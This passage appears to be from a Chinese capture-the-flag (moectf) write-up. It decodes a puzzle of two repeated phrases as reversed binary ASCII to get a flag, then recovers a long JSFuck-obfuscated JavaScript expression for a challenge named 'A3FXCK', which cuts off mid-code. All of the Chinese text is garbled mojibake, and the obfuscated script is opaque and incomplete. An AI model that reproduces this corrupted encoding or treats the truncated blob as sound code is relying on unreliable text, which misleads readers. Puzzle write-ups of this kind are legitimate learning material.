å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿</span><br></pre></td></tr></table></figure>

<p>æ–‡æœ¬ä¸­åªæœ‰<code>ä¸ä¼šå§ï¼Ÿ</code>å’Œ<code>å°±è¿™Â¿</code>ï¼Œæ¨æµ‹æ˜¯äºŒè¿›åˆ¶</p>
<p>æ¯è¡Œé•¿åº¦éƒ½æ˜¯å…«ä¸ªè¯ï¼Œæœ«å°¾éƒ½æ˜¯â€œå°±è¿™Â¿â€ï¼ŒASCIIç çš„äºŒè¿›åˆ¶æœ€é«˜ä½éƒ½æ˜¯0ï¼Œæ•…æ¨æµ‹æ˜¯ASCIIç é€†åº</p>
<p>å·¥å…·äººæ‰‹åŠ¨è½¬ç ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">10011010</span><br><span class="line">00001100</span><br><span class="line">10101110</span><br><span class="line">11111010</span><br><span class="line">11101110</span><br><span class="line">00010110</span><br><span class="line">00101100</span><br><span class="line">00101110</span><br><span class="line">11111100</span><br><span class="line">10110100</span><br><span class="line">00001100</span><br><span class="line">01110110</span><br><span class="line">10001100</span><br><span class="line">10011110</span><br><span class="line">11111010</span><br><span class="line">00101110</span><br><span class="line">00010110</span><br><span class="line">10001100</span><br><span class="line">11001010</span><br><span class="line">11111100</span><br></pre></td></tr></table></figure>

<p>é€†åºåè½¬æˆæ•°å­—å°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">89</span><br><span class="line">48</span><br><span class="line">117</span><br><span class="line">95</span><br><span class="line">119</span><br><span class="line">104</span><br><span class="line">52</span><br><span class="line">116</span><br><span class="line">63</span><br><span class="line">45</span><br><span class="line">48</span><br><span class="line">110</span><br><span class="line">49</span><br><span class="line">121</span><br><span class="line">95</span><br><span class="line">116</span><br><span class="line">104</span><br><span class="line">49</span><br><span class="line">83</span><br><span class="line">63</span><br></pre></td></tr></table></figure>

<p>å¯¹ç…§ASCIIç è¡¨å³å¾—flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_wh4t?-0n1y_th1S?&#125;</span><br></pre></td></tr></table></figure>

<h2 id="A3FXCK"><a href="#A3FXCK" class="headerlink" title="A3FXCK"></a>A3FXCK</h2><p>æƒ¯ä¾‹çš„å›¾ç‰‡åç¼€åæ”¹zipè§£å‹å¾—åˆ°è¿™æ ·ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£</p>
<p><img src="https://i.loli.net/2020/10/08/La7GHyJqUgs8Ypk.png" alt="image.png"></p>
<p>å¼€å¤´ç¬¬ä¸€è¡Œæç¤º<code>123456</code>å¯¹åº”<code>[]()+!</code>ï¼Œè€Œæ–‡æœ¬ä¸­å­˜åœ¨<code>luoq1an</code>ã€<code>arttnba2</code>ã€<code>arttnba3</code>ã€<code>luoqi4n</code>ã€<code>arttnba5</code>ã€<code>arttnba6</code>ï¼Œæ•…è€ƒè™‘è¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢</p>
<p>å¾—åˆ°å¦‚ä¸‹æ–‡æœ¬</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!!